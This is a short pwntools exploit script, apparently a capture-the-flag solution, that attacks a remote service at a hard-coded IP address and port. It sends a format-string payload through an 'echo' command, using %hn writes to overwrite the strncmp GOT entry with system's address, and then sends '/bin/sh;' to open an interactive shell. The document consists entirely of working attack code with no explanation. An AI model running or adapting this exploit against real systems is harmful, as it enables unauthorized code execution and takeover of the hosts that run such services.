from pwn import *

#r = process('./gsh_v1')
r = remote('106.10.34.139', 20004)

system_plt = 0x08048510
strncmp_got = 0x0804a038

system_l = system_plt & 0xffff
system_h = system_plt >> 16

payload = p32(strncmp_got) + p32(strncmp_got+2)
payload += '%{}c%9$hn'.format(system_l - 11)
payload += '%{}c%10$hn'.format(0x10000 + system_h - system_l)
r.sendlineafter('$ ', 'echo'+' '*4+payload)
r.sendlineafter('$ ', '/bin/sh;')

r.interactive()
